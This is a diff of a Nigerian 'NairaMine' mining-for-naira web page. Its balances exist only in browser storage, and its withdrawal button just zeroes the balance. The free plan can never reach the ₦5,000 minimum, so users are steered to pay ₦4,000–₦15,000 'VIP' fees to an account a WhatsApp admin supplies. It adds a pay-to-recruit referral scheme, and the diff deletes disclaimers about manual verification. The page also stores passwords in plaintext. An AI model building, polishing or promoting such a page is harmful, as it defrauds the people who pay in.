@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>NairaMine - Mine. Earn. Cash out in Naira.</title>
+<title>NairaMine - Earn in Naira</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 body{font-family:Arial;background:#0a0f1e;color:white;text-align:center;padding:20px;margin:0}
 h1{font-size:32px;color:#00ff88}
-button{background:#00ff88;border:none;padding:14px;font-size:16px;border-radius:10px;font-weight:bold;cursor:pointer;width:100%;max-width:430px;margin:5px 0;color:#000}
+button{background:#00ff88;border:none;padding:14px;font-size:16px;border-radius:10px;font-weight:bold;cursor:pointer;width:100%;max-width:400px;margin:5px 0}
 button.secondary{background:#2a3555;color:white}
 button:disabled{background:#555;color:#aaa}
 .card{background:#131a2e;padding:18px;border-radius:15px;margin:15px auto;max-width:430px;text-align:left}
@@ -14,7 +14,7 @@ button:disabled{background:#555;color:#aaa}
 input,select{width:100%;padding:13px;margin:8px 0;border-radius:10px;border:none;font-size:16px;box-sizing:border-box}
 .link{color:#00ff88;cursor:pointer;text-decoration:underline}
 .hidden{display:none}
-.small{font-size:13px;color:#aaa;line-height:1.5}
+.small{font-size:14px;color:#aaa}
 .balance{font-size:44px;color:#00ff88;text-align:center;margin:5px 0}
 .vip{border:2px solid #2a3555;padding:12px;border-radius:12px;margin:8px 0}
 .vip.active{border-color:#00ff88;background:#1a2f25}
@@ -26,19 +26,16 @@ th{background:#1e2a4a;color:#00ff88}
 </style>
 </head>
 <body>
-
 <div id="home">
 <h1>⛏️ NairaMine</h1>
 <p>Mine. Earn. Cash out in Naira.</p>
-<div class="card center"><h2>Welcome to NairaMine</h2><p>Mine every 4 hours. Do tasks, refer friends, go VIP. Min Withdrawal ₦5,000 after 15 days.</p><button onclick="showAuth()">Start Mining Now</button></div>
-<div class="card"><h3>💰 How You Earn in 15 Days</h3><p class="small">Mining + Tasks ₦525 + Referral (only when friend buys VIP). FREE mining + tasks = ₦975 - cannot withdraw alone. Earnings depend on completing tasks and manual verification.</p></div>
+<div class="card center"><h2>Welcome to NairaMine</h2><p>Mine every 4 hours. Do tasks, refer friends, go VIP. Min Withdrawal ₦5,000.</p><button onclick="showAuth()">Start Mining Now</button></div>
+<div class="card"><h3>💰 How You Earn in 15 Days</h3><p class="small">Mining + Tasks ₦525 + Referral (only when friend buys VIP). FREE total = ₦975 - cannot withdraw alone.</p></div>
 </div>
-
 <div id="auth" class="hidden">
 <h1>⛏️ NairaMine</h1>
 <div class="card center"><h2 id="authTitle">Create Account</h2><input id="name" placeholder="Full Name"><input id="email" placeholder="Email"><input id="password" type="password" placeholder="Password"><button onclick="signup()" id="authBtn">Sign Up</button><p class="small" id="msg"></p><p><span id="toggleText">Already have account?</span> <span class="link" onclick="toggleAuth()" id="toggleLink">Login</span></p><p><span class="link" onclick="showHome()">← Back</span></p></div>
 </div>
-
 <div id="dash" class="hidden">
 <h1>⛏️ NairaMine</h1>
 <div class="card center">
@@ -47,40 +44,42 @@ th{background:#1e2a4a;color:#00ff88}
 <p class="small">Plan: <b id="planName">FREE</b> | <span id="mineInfo"></span> | Referral: <b id="refRate">₦100</b> per boosted friend | <span id="daysLeftMsg"></span></p>
 <button onclick="mine()" id="mineBtn">⛏️ Mine Now</button>
 <p class="small" id="timer"></p>
+</div><div class="card">
+<h3>💎 VIP PLANS - 15 Days</h3>
+<p class="small">Higher plan = Higher profit. Profit = Mining + Tasks ₦525 - Price.</p>
+<div class="vip active" id="vip-free"><b>🆓 FREE - 30/day</b><br><span class="small">5 per mine, every 4 hours. Mining ₦450 + Tasks ₦525 = ₦975 total. Profit ₦975</span><br><button class="secondary" onclick="setPlan('FREE',5)">Current Plan</button></div>
+<div class="vip" id="vip-bronze"><b>🥉 Bronze - ₦4,000</b><br><span class="small">50 per mine = 300/day. Mining ₦4,500 + Tasks ₦525 = ₦5,025 total. Profit ₦1,025</span><br><button onclick="buyVip('Bronze',4000)">Buy Bronze</button></div>
+<div class="vip" id="vip-silver"><b>🥈 Silver - ₦5,000</b><br><span class="small">65 per mine = 390/day. Mining ₦5,850 + Tasks ₦525 = ₦6,375 total. Profit ₦1,375</span><br><button onclick="buyVip('Silver',5000)">Buy Silver</button></div>
+<div class="vip" id="vip-gold"><b>🥇 Gold - ₦6,000</b><br><span class="small">85 per mine = 510/day. Mining ₦7,650 + Tasks ₦525 = ₦8,175 total. Profit ₦2,175</span><br><button onclick="buyVip('Gold',6000)">Buy Gold</button></div>
+<div class="vip" id="vip-platinum"><b>💎 Platinum - ₦10,000</b><br><span class="small">150 per mine = 900/day. Mining ₦13,500 + Tasks ₦525 = ₦14,025 total. Profit ₦4,025</span><br><button onclick="buyVip('Platinum',10000)">Buy Platinum</button></div>
+<div class="vip" id="vip-diamond"><b>👑 Diamond - ₦15,000</b><br><span class="small">250 per mine = 1,500/day. Mining ₦22,500 + Tasks ₦525 = ₦23,025 total. Profit ₦8,025</span><br><button onclick="buyVip('Diamond',15000)">Buy Diamond</button></div>
+<p class="small">To buy VIP: Message admin on WhatsApp <b>09158978606</b> to get account number. Pay, then send proof below. Admin verifies manually.</p>
+<a href="https://wa.me/2349158978606?text=Hello%20Admin%2C%20I%20want%20to%20buy%20VIP.%20Please%20send%20account%20number." target="_blank" style="text-decoration:none"><button>Get Account Number on WhatsApp - 09158978606</button></a>
 </div>
-
 <div class="card">
-<h3>💎 VIP PLANS - 15 Days - Optional</h3>
-<p class="small">VIP is OPTIONAL. Higher plan = higher mining rate. Example profit = Mining + Tasks ₦525 - Price.</p>
-<div class="vip active" id="vip-free"><b>🆓 FREE - 5 per mine</b><br><span class="small">30/day. Mining ₦450 + Tasks ₦525 = ₦975 total in 15 days.</span><br><button class="secondary" onclick="setPlan('FREE',5)">Current Plan</button></div>
-<div class="vip" id="vip-bronze"><b>🥉 Bronze - ₦4,000 - 50 per mine</b><br><span class="small">300/day. Mining ₦4,500 + Tasks ₦525 = ₦5,025 total. Example profit ₦1,025</span><br><button onclick="buyVip('Bronze',50,4000)">Buy Bronze</button></div>
-<div class="vip" id="vip-silver"><b>🥈 Silver - ₦5,000 - 65 per mine</b><br><span class="small">390/day. Mining ₦5,850 + Tasks ₦525 = ₦6,375 total. Example profit ₦1,375</span><br><button onclick="buyVip('Silver',65,5000)">Buy Silver</button></div>
-<div class="vip" id="vip-gold"><b>🥇 Gold - ₦6,000 - 85 per mine</b><br><span class="small">510/day. Mining ₦7,650 + Tasks ₦525 = ₦8,175 total. Example profit ₦2,175</span><br><button onclick="buyVip('Gold',85,6000)">Buy Gold</button></div>
-<div class="vip" id="vip-platinum"><b>💎 Platinum - ₦10,000 - 150 per mine</b><br><span class="small">900/day. Mining ₦13,500 + Tasks ₦525 = ₦14,025 total. Example profit ₦4,025</span><br><button onclick="buyVip('Platinum',150,10000)">Buy Platinum</button></div>
-<div class="vip" id="vip-diamond"><b>👑 Diamond - ₦15,000 - 250 per mine</b><br><span class="small">1,500/day. Mining ₦22,500 + Tasks ₦525 = ₦23,025 total. Example profit ₦8,025</span><br><button onclick="buyVip('Diamond',250,15000)">Buy Diamond</button></div>
-<p class="small">To buy VIP / Boost: Message admin on WhatsApp <b>09158978606</b> to get account number. Pay, then send proof below. Admin verifies manually before activating.</p>
-<a href="https://wa.me/2349158978606?text=Hello%20NairaMine%20Admin%2C%20I%20want%20to%20buy%20VIP%20%2F%20Boost.%20Please%20send%20me%20the%20account%20number." target="_blank" style="text-decoration:none"><button>Get Account Number on WhatsApp - 09158978606</button></a>
-</div>
-
-<div class="card">
-<h3>📋 DAILY TASKS - ₦35/day - With Links</h3>
-<div class="task"><span>✅ Check-in: ₦10</span><button onclick="doTask('checkin',10,this)">Claim</button></div>
-<div class="task"><span>📺 Watch Ads: ₦15</span><span><a href="https://araplhn.org/4/cb98cb8e497cb7eecc4dd44213d4b012" target="_blank" style="background:#f59e0b;color:white;padding:8px 10px;border-radius:8px;text-decoration:none;font-weight:bold;font-size:13px;">Watch</a> <button onclick="doTask('ads',15,this)" style="margin-left:4px;">Claim</button></span></div>
-<div class="task"><span>📢 Stay in Channel: ₦10</span><span><a href="https://t.me/NairaMineUpdates" target="_blank" style="background:#3b82f6;color:white;padding:8px 10px;border-radius:8px;text-decoration:none;font-weight:bold;font-size:13px;">Join</a> <button onclick="doTask('channel',10,this)" style="margin-left:4px;">Claim</button></span></div>
-<p class="small">Total: 35/day = ₦525 in 15 days. Tasks reset daily. Same for all plans.</p>
+<h3>📋 DAILY TASKS - 35/day - With Links</h3>
+<div class="task"><span>✅ Check-in: 10</span><button onclick="doTask('checkin',10,this)">Claim</button></div>
+<div class="task"><span>✅ Watch Ads: 15</span><span><a href="https://araplhn.org/4/cb98cb8e497cb7eecc4dd44213d4b012" target="_blank" style="background:#f59e0b;color:white;padding:8px 10px;border-radius:8px;text-decoration:none;font-weight:bold;font-size:13px;">Watch</a> <button onclick="doTask('ads',15,this)" style="margin-left:4px;">Claim</button></span></div>
+<div class="task"><span>✅ Stay in Channel: 10</span><span><a href="https://t.me/NairaMineUpdates" target="_blank" style="background:#3b82f6;color:white;padding:8px 10px;border-radius:8px;text-decoration:none;font-weight:bold;font-size:13px;">Join</a> <button onclick="doTask('channel',10,this)" style="margin-left:4px;">Claim</button></span></div>
+<p class="small">Total: 35/day = ₦245/week = ₦525 in 15 days = ₦1,050 in 30 days. Tasks reset daily. Same for all plans.</p>
 <a href="https://t.me/NairaMineUpdates" target="_blank" style="text-decoration:none"><button class="secondary">Join Telegram Channel - https://t.me/NairaMineUpdates</button></a>
-</div>
-
-<div class="card center">
+                                                                                                                                                              </div><div class="card center">
 <h3>👥 Refer & Earn - Only When Friend Boosts</h3>
 <p class="small"><b>⚠️ If your friend stays FREE, you get ₦0. You only earn when your friend buys VIP / boosts.</b></p>
-<table><tr><th>Your Plan</th><th>Per Boosted Friend</th></tr><tr><td>🆓 FREE</td><td>₦100</td></tr><tr><td>🥉 Bronze</td><td>₦200</td></tr><tr><td>🥈 Silver</td><td>₦250</td></tr><tr><td>🥇 Gold</td><td>₦300</td></tr><tr><td>💎 Platinum</td><td>₦400</td></tr><tr><td>👑 Diamond</td><td>₦500</td></tr></table>
+<table>
+<tr><th>Your Plan</th><th>Per Boosted Friend</th></tr>
+<tr><td>🆓 FREE</td><td>₦100</td></tr>
+<tr><td>🥉 Bronze</td><td>₦200</td></tr>
+<tr><td>🥈 Silver</td><td>₦250</td></tr>
+<tr><td>🥇 Gold</td><td>₦300</td></tr>
+<tr><td>💎 Platinum</td><td>₦400</td></tr>
+<tr><td>👑 Diamond</td><td>₦500</td></tr>
+</table>
 <p class="small">Example: You are Gold, you invite 10 friends, 3 boost = 3 x ₦300 = ₦900. 7 FREE friends = ₦0.</p>
 <input id="refLink" readonly>
 <button onclick="copyRef()" class="secondary">Copy Refer Link</button>
 <p class="small" id="refMsg"></p>
 </div>
-
 <div class="card">
 <h3>🧾 Send Proof of Payment - VIP / Boost</h3>
 <p class="small">After you pay for VIP, enter details and send proof to admin on WhatsApp. Admin verifies manually.</p>
@@ -88,9 +87,69 @@ th{background:#1e2a4a;color:#00ff88}
 <input type="tel" id="proofAmount" placeholder="Amount Paid e.g. 4000">
 <input type="file" id="proofFile" accept="image/*">
 <button onclick="sendProof()" style="background:#25D366;">Send Proof on WhatsApp - 09158978606</button>
-<p class="small">This opens WhatsApp with your details. You attach your receipt screenshot there. No payment is confirmed automatically.</p>
 </div>
-
 <div class="card" style="border:2px solid #00ff88;">
 <h3>⚠️ Important Notice From Admin</h3>
-<p class="small">1. <b>VIP / Boost is 100% OPTIONAL.</b> You do NOT need to pay to withdraw normal
+<p class="small">1. <b>VIP / Boost is 100% OPTIONAL.</b> You do NOT need to pay to withdraw normal earnings if you reach ₦5,000 and 15 days.<br><br>2. <b>Boost Does Not Guarantee Earnings.</b> It only increases mining rate.<br><br>3. <b>All Payments Verified Manually.</b> Send proof on WhatsApp, admin checks bank app.<br><br>4. <b>Do Not Pay Anyone Else.</b> Only pay to account admin sends on WhatsApp 09158978606.</p>
+</div>
+<div class="card">
+<h3>🏦 Withdraw - Min ₦5,000 - After 15 Days</h3>
+<p class="small"><b>Where to withdraw:</b><br>1. Reach ₦5,000+<br>2. Complete 15 days<br>3. Save OPay / PalmPay / Bank details below<br>4. Tap Request Withdrawal<br>5. Admin pays within 24h after verification.</p>
+<label style="font-size:13px;color:#aaa;">Bank / App Name</label>
+<select id="bankName"><option>OPay</option><option>PalmPay</option><option>Moniepoint</option><option>Access Bank</option><option>GTBank</option><option>First Bank</option><option>UBA</option><option>Other Bank</option></select>
+<label style="font-size:13px;color:#aaa;">Account Number (10 digits)</label>
+<input type="tel" id="acctNum" placeholder="e.g. 8012345678" maxlength="10">
+<label style="font-size:13px;color:#aaa;">Account Name</label>
+<input type="text" id="acctName" placeholder="e.g. Blessing Adeola">
+<button onclick="saveAccount()" class="secondary">Save Account Details</button>
+<p class="small" id="savedMsg"></p>
+<button onclick="withdraw()">Request Withdrawal</button>
+<p class="small" id="withdrawMsg"></p>
+<button onclick="logout()" class="secondary">Logout</button>
+</div>
+<div class="card">
+<h3>📊 COMPLETE PROFIT IN 15 DAYS</h3>
+<table>
+<tr><th>Plan</th><th>No Referral</th><th>+5 Boosted</th><th>+10 Boosted</th></tr>
+<tr><td>FREE</td><td>₦975</td><td>₦1,475</td><td>₦1,975</td></tr>
+<tr><td>Bronze</td><td>₦1,025</td><td>₦2,025</td><td>₦3,025</td></tr>
+<tr><td>Silver</td><td>₦1,375</td><td>₦2,625</td><td>₦3,875</td></tr>
+<tr><td>Gold</td><td>₦2,175</td><td>₦3,675</td><td>₦5,175</td></tr>
+<tr><td>Platinum</td><td>₦4,025</td><td>₦6,025</td><td>₦8,025</td></tr>
+<tr><td>Diamond</td><td>₦8,025</td><td>₦10,525</td><td>₦13,025</td></tr>
+</table>
+<p class="small">Total Profit = Mining Profit + ₦525 Tasks + (Your Referral Price x Boosted Friends). Min Withdrawal ₦5,000.</p>
+</div>
+                                                                                                                                                                                                  </div><script>
+let isLogin=false;
+let balance=parseInt(localStorage.getItem('balance')||'0');
+let plan=localStorage.getItem('plan')||'FREE';
+let mineAmount=parseInt(localStorage.getItem('mineAmount')||'5');
+let lastMine=parseInt(localStorage.getItem('lastMine')||'0');
+let tasksDone=JSON.parse(localStorage.getItem('tasksDone')||'{}');
+let today=new Date().toDateString();
+if(localStorage.getItem('taskDay')!==today){tasksDone={};localStorage.setItem('taskDay',today);}
+let refRates={'FREE':100,'Bronze':200,'Silver':250,'Gold':300,'Platinum':400,'Diamond':500};
+function showAuth(){hideAll();document.getElementById('auth').classList.remove('hidden');}
+function showHome(){hideAll();document.getElementById('home').classList.remove('hidden');}
+function hideAll(){['home','auth','dash'].forEach(id=>document.getElementById(id).classList.add('hidden'))}
+function toggleAuth(){isLogin=!isLogin;document.getElementById('authTitle').innerText=isLogin?'Login':'Create Account';document.getElementById('authBtn').innerText=isLogin?'Login':'Sign Up';document.getElementById('toggleText').innerText=isLogin?'No account yet?':'Already have account?';document.getElementById('toggleLink').innerText=isLogin?'Sign Up':'Login';document.getElementById('name').style.display=isLogin?'none':'block';}
+function signup(){let name=document.getElementById('name').value;let email=document.getElementById('email').value;let pass=document.getElementById('password').value;let msg=document.getElementById('msg');if(!email||!pass){msg.innerText='Fill email and password';return;}if(isLogin){let s=JSON.parse(localStorage.getItem('user')||'{}');if(s.email===email&&s.pass===pass)showDash(s.name);else msg.innerText='Wrong email or password';}else{if(!name){msg.innerText='Enter your name';return;}localStorage.setItem('user',JSON.stringify({name:name,email:email,pass:pass}));if(!localStorage.getItem('nm_first_day'))localStorage.setItem('nm_first_day',Date.now());showDash(name);}}
+function showDash(name){hideAll();document.getElementById('dash').classList.remove('hidden');document.getElementById('userName').innerText=name;document.getElementById('refLink').value='https://nairamine.onrender.com/?ref='+encodeURIComponent(name.replace(/\s/g,''));document.getElementById('acctNum').value=localStorage.getItem('nm_acct')||'';document.getElementById('acctName').value=localStorage.getItem('nm_name')||'';document.getElementById('bankName').value=localStorage.getItem('nm_bank')||'OPay';updateUI();updateDays();setInterval(updateTimer,1000);}
+function updateUI(){document.getElementById('balance').innerText=balance.toLocaleString();document.getElementById('planName').innerText=plan;document.getElementById('mineInfo').innerText=mineAmount+' per mine';document.getElementById('refRate').innerText='₦'+(refRates[plan]||100);localStorage.setItem('balance',balance);['free','bronze','silver','gold','platinum','diamond'].forEach(p=>{let el=document.getElementById('vip-'+p);if(el)el.classList.remove('active')});let active=document.getElementById('vip-'+plan.toLowerCase());if(active)active.classList.add('active');}
+function mine(){let now=Date.now();let diff=now-lastMine;if(diff<4*60*60*1000&&lastMine!==0){alert('Wait! You can mine again in '+formatTime(4*60*60*1000-diff));return;}balance+=mineAmount;lastMine=now;localStorage.setItem('lastMine',lastMine);updateUI();alert('✅ You mined ₦'+mineAmount+'! Balance: ₦'+balance);}
+function formatTime(ms){let h=Math.floor(ms/3600000);let m=Math.floor((ms%3600000)/60000);let s=Math.floor((ms%60000)/1000);return h+'h '+m+'m '+s+'s';}
+function updateTimer(){let now=Date.now();let remain=4*60*60*1000-(now-lastMine);let btn=document.getElementById('mineBtn');let t=document.getElementById('timer');if(lastMine===0||remain<=0){btn.disabled=false;btn.innerText='⛏️ Mine Now - ₦'+mineAmount;t.innerText='Ready to mine!';}else{btn.disabled=true;btn.innerText='⏳ Mining Locked';t.innerText='Next mine in: '+formatTime(remain);}}
+function setPlan(p,amt){plan=p;mineAmount=amt;localStorage.setItem('plan',plan);localStorage.setItem('mineAmount',mineAmount);updateUI();}
+function buyVip(p,price){let ok=confirm('Buy '+p+' for ₦'+price+'? Message admin on WhatsApp 09158978606 to get account number, pay, then send proof. Tap OK to open WhatsApp.');if(ok){window.open('https://wa.me/2349158978606?text='+encodeURIComponent('Hello Admin, I want to buy '+p+' VIP for ₦'+price+'. Please send account number.'),'_blank');}}
+function doTask(key,amt,btn){if(tasksDone[key]){alert('Already claimed today');return;}tasksDone[key]=true;localStorage.setItem('tasksDone',JSON.stringify(tasksDone));balance+=amt;updateUI();btn.innerText='Done ✓';btn.disabled=true;alert('✅ +₦'+amt+' Task done!');}
+function sendProof(){let n=document.getElementById('proofName').value.trim();let a=document.getElementById('proofAmount').value.trim();if(!n||!a){alert('Enter name and amount');return;}window.open('https://wa.me/2349158978606?text='+encodeURIComponent('Hello Admin, I paid for VIP/Boost. Name: '+n+' Amount: ₦'+a+' I will attach my receipt.'),'_blank');}
+function saveAccount(){let num=document.getElementById('acctNum').value.trim();let name=document.getElementById('acctName').value.trim();let bank=document.getElementById('bankName').value;if(num.length!==10){alert('Account number must be 10 digits!');return;}if(!name){alert('Enter account name!');return;}localStorage.setItem('nm_acct',num);localStorage.setItem('nm_name',name);localStorage.setItem('nm_bank',bank);document.getElementById('savedMsg').innerText='Saved: '+bank+' - '+num+' ('+name+')';alert('Account saved!');}
+function updateDays(){let first=localStorage.getItem('nm_first_day');if(!first){first=Date.now();localStorage.setItem('nm_first_day',first);}let used=Math.floor((Date.now()-parseInt(first))/(1000*60*60*24));let left=15-used;if(left<0)left=0;document.getElementById('daysLeftMsg').innerText=left===0?'✅ 15 days complete':'⏳ Day '+(used+1)+' of 15 - '+left+' days left';}
+function getDaysLeft(){let first=parseInt(localStorage.getItem('nm_first_day')||Date.now());let used=Math.floor((Date.now()-first)/(1000*60*60*24));let left=15-used;return left<0?0:left;}
+function withdraw(){let msg=document.getElementById('withdrawMsg');let num=document.getElementById('acctNum').value.trim();if(balance<5000){msg.innerText='❌ Minimum withdrawal is ₦5,000. Your balance: ₦'+balance.toLocaleString()+'. Keep mining!';return;}if(getDaysLeft()>0){msg.innerText='❌ You have '+getDaysLeft()+' days left. Complete 15 days first.';return;}if(num.length!==10){msg.innerText='❌ First save your 10-digit account number!';return;}msg.innerText='✅ Withdraw request sent! ₦'+balance.toLocaleString()+' to '+document.getElementById('bankName').value+' - '+num+'. Admin will contact you.';balance=0;updateUI();}
+function copyRef(){let i=document.getElementById('refLink');i.select();document.execCommand('copy');document.getElementById('refMsg').innerText='Link copied! You earn only when friend buys VIP.';}
+function logout(){showHome();}
+</script>
+</body>
+</html>
